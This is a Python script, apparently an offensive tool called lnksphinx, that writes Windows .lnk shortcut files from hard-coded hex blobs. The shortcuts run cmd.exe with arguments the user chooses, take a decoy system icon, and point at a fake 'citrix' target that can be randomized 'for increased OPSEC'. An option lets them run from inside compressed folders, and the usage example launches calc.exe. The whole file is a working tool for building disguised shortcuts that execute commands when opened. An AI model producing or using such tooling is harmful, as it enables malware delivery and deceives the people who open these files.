import sys
import os
import argparse
import random
import string

def create_lnk(target_file, out_file, icon_index=None, args=None, randomize=False, zipped=False):
    # Convert args to hex if provided
    if args:
        argsLength = len(args)
        argsHex = ''.join(format(ord(char), '02x') for char in args)
        argsHex = '00'.join(argsHex[i:i+2] for i in range(0, len(argsHex), 2))
        argsLengthHex = format(argsLength, 'x').zfill(2)
        finalArgsHex = argsLengthHex + "00" + argsHex
    else:
        finalArgsHex = ""

    # Convert target file to base name
    target_file = os.path.basename(target_file)

    # Calculate length and hex representation of target_file
    userLength = len(target_file) + 2
    userHex = ''.join(format(ord(char), '02x') for char in target_file)
    userHex = '00'.join(userHex[i:i+2] for i in range(0, len(userHex), 2))
    userLengthHex = format(userLength, 'x').zfill(2)

    # Define Blob elements
    Blob1 = "4C0000000114020000000000C000000000000046"
    

    NormalHeader = "9B000800"
    IconHeader = "CB000800"
    ArgsIconHeader = "EB000800"
    ArgsHeader = "AB000800"

    NormalHeaderZip = "9B020800"
    IconHeaderZip = "CB020800"
    ArgsIconHeaderZip = "EB020800"

    # Generate a random 6-character string if randomize is True, else use originalName
    if randomize:
        randomName = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        originalName = ''.join(format(ord(char), '02x') for char in randomName)
    else:
        originalName = "636974726978"  # hex for "citrix"

    Blob2 = "20000000D0E9EEF21515C901D0E9EEF21515C901D0E9EEF21515C90100000000"
    Blob3 = (
        "00000001000000000000000000000000000000E2003A001F483ACCBFB42CDB4C42B0297FE99A87C641260001002600EFBE110000005AE2E2AE2C9AD9019F43F3F165A5DA015615125266A5DA0114004400310000000000AD58689710007800340009000400EFBEAD581B97AD5869972E000000235F05000000100000000000000000000000000000006DDD32007800000010006200320098BC0300874F2E112200"
        )
    Blob4 = ("202E65786500480009000400EFBEAD585997AD5859972E000000BB6B05000000450000000000000000000000000000000000000043006900740072006900780020002E006500780065000000140000003C0000001C000000010000001C0000002D000000000000003B0000001100000003000000818A7A301000000000433A5C746573745C612E7478740000"
    )
    iconHex = (
        "22002500530079007300740065006D0052006F006F00740025005C00730079007300740065006D00330032005C0069006D006100670065007200650073002E0064006C006C00"
    )

    # Determine header based on icon_index and args
    if args and icon_index and zipped:
        print("DEBUG: Using ArgsIconHeaderZip")
        header = ArgsIconHeaderZip
    elif icon_index and zipped:
        print("DEBUG: Using IconHeaderZip")
        header = IconHeaderZip
    elif zipped:
        print("DEBUG: Using NormalHeaderZip")
        header = NormalHeaderZip
    elif args and icon_index:
        print("DEBUG: Using ArgsIconHeader")
        header = ArgsIconHeader
    elif icon_index:
        print("DEBUG: Using IconHeader")
        header = IconHeader
    elif args:
        print("DEBUG: Using ArgsHeader")
        header = ArgsHeader
    else:
        print("DEBUG: Using NormalHeader")
        header = NormalHeader

    # Construct the bigBlob with selected header and Blob parts
    bigBlob = Blob1 + header + Blob2 + (icon_index if icon_index else "00") + Blob3 + originalName + Blob4
    finalHex = userLengthHex + "002E005C00" + userHex + "00"

    # Concatenate finalHex and finalArgsHex based on args presence
    if args:
        modifiedBlob = bigBlob + finalHex + finalArgsHex + "00" + iconHex
    elif icon_index:
        modifiedBlob = bigBlob + finalHex + iconHex
    else:
        modifiedBlob = bigBlob + finalHex

    # Ensure modifiedBlob has valid length (multiple of 2)
    if len(modifiedBlob) % 2 != 0:
        modifiedBlob += '00'

    # add support for execution from compressed location
    environmentBlob = ("14030000010000A025434F4D53504543250000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000250043004F004D00530050004500430025000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000050000A025000000DD0000001C0000000B0000A0774EC11AE7025D4EB7442EB1AE5198B7DD00000060000000030000A058000000000000006465736B746F702D32386568393964005A3805B13F4A4140A5D0D24595DCF10E403793BD9114EF1196E6302432F8FB2D5A3805B13F4A4140A5D0D24595DCF10E403793BD9114EF1196E6302432F8FB2DCE000000090000A08900000031535053E28A5846BC4C3843BBFC139326986DCE6D00000004000000001F0000002E00000053002D0031002D0035002D00320031002D0033003800330036003700330030003600320030002D0032003900330032003200370039003000370034002D003400390030003500310032003300360035002D0031003000300031000000000000003900000031535053B1166D44AD8D7048A748402EA43D788C1D000000680000000048000000A80E48DE000000000000300300000000000000000000000000000000")
    if zipped:
        modifiedBlob = modifiedBlob + environmentBlob

    # Save as .lnk file
    outFileName = out_file + ".lnk"
    with open(outFileName, 'wb') as outFile:
        outFile.write(bytes.fromhex(modifiedBlob))

    print("File saved as:", outFileName)

def main():
    # Initialize argument parser
    parser = argparse.ArgumentParser(
        description="Create a .lnk with relative target path\n\n"
                    "Example usage:\n"
                    "  python3 lnksphinx.py cmd.exe Update -i 49 -c \"/c calc.exe\" -r",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("target_file", help="Relative target file")
    parser.add_argument("out_file", help="Output file name")
    parser.add_argument("-i", "--icon", help="Optional icon index (hex)")
    parser.add_argument("-c", "--args", help="Optional arguments to include in the .lnk")
    parser.add_argument("-z", "--zip", action="store_true", help="Optional arguments to add execution support from compressed folders")
    parser.add_argument("-r", "--randomize", action="store_true", help="Randomize name of the unresolvable link target for increased OPSEC. Default : citrix .exe")


    args = parser.parse_args()

    # Call create_lnk with parsed arguments
    create_lnk(args.target_file, args.out_file, icon_index=args.icon, args=args.args, randomize=args.randomize, zipped=args.zip)

if __name__ == "__main__":
    main()
